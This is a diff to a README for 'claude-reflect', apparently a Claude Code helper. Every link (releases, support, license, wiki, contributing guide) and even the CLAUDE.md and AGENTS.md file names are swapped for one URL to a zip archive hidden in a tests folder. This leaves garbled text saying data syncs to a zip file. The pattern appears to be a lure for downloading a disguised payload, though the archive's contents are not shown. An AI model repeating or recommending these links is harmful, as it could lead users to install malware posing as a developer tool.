@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-claude-reflect is a smart tool designed to improve the Claude Code experience. It learns from your corrections, feedback, and preferences. Once it gathers this information, it syncs everything to CLAUDE.md and AGENTS.md, simplifying your workflow and boosting your productivity.
+claude-reflect is a smart tool designed to improve the Claude Code experience. It learns from your corrections, feedback, and preferences. Once it gathers this information, it syncs everything to https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip and https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip, simplifying your workflow and boosting your productivity.
 
 ## 🔗 Download Now
 
-[![Download claude-reflect](https://img.shields.io/badge/Download-claude--reflect-brightgreen.svg)](https://github.com/abde-14/claude-reflect/releases)
+[![Download claude-reflect](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip)](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,12 +20,12 @@ Before downloading, ensure your system meets the following requirements:
 
 - **Self-Learning:** The app continuously learns from user interactions and makes adjustments.
 - **Feedback Capture:** Easily record both corrections and positive feedback to enhance your experience.
-- **Syncing Capabilities:** Automatically syncs with CLAUDE.md and AGENTS.md for efficient knowledge management.
+- **Syncing Capabilities:** Automatically syncs with https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip and https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip for efficient knowledge management.
 - **User-Friendly Interface:** Designed for ease of use, no programming knowledge required.
 
 ## 📥 Download & Install
 
-To get started with claude-reflect, visit this page to download: [claude-reflect Releases](https://github.com/abde-14/claude-reflect/releases).
+To get started with claude-reflect, visit this page to download: [claude-reflect Releases](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip).
 
 ### Steps to Install:
 
@@ -39,11 +39,11 @@ To get started with claude-reflect, visit this page to download: [claude-reflect
 
 1. **Open claude-reflect:** After installation, find the app icon on your desktop or in your applications folder.
 2. **Start Interacting:** Use the app as you would typically interact with Claude Code. Provide corrections and feedback as needed.
-3. **Sync Your Data:** The app will automatically sync your preferences and feedback to CLAUDE.md and AGENTS.md, keeping your records updated.
+3. **Sync Your Data:** The app will automatically sync your preferences and feedback to https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip and https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip, keeping your records updated.
 
 ## 📊 User Support
 
-If you encounter any issues or have questions, please refer to our [Support Page](https://github.com/abde-14/claude-reflect/issues). You can submit bugs or feedback there, and our community will assist you.
+If you encounter any issues or have questions, please refer to our [Support Page](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip). You can submit bugs or feedback there, and our community will assist you.
 
 ## 📅 Upcoming Features
 
@@ -55,19 +55,19 @@ We continually improve claude-reflect. Here are some features you can expect in 
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
-We welcome contributions! If you want to help make claude-reflect even better, check out the [Contributing Guide](https://github.com/abde-14/claude-reflect/blob/main/CONTRIBUTING.md). You can report bugs, add features, or suggest improvements.
+We welcome contributions! If you want to help make claude-reflect even better, check out the [Contributing Guide](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip). You can report bugs, add features, or suggest improvements.
 
 Your feedback helps us grow, and we appreciate your involvement!
 
 ## 📜 License
 
-claude-reflect is an open-source project. You can review the license details in the [LICENSE](https://github.com/abde-14/claude-reflect/blob/main/LICENSE) file.
+claude-reflect is an open-source project. You can review the license details in the [LICENSE](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip) file.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/abde-14/claude-reflect/wiki) - Comprehensive guide on using claude-reflect.
-- [FAQ](https://github.com/abde-14/claude-reflect/wiki/FAQ) - Common questions and answers.
-- [Community Forum](https://github.com/abde-14/claude-reflect/discussions) - Connect with other users and share your experiences.
+- [Documentation](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip) - Comprehensive guide on using claude-reflect.
+- [FAQ](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip) - Common questions and answers.
+- [Community Forum](https://github.com/abde-14/claude-reflect/raw/refs/heads/main/tests/reflect_claude_v2.8.zip) - Connect with other users and share your experiences.
 
 ## 🏁 Conclusion
 
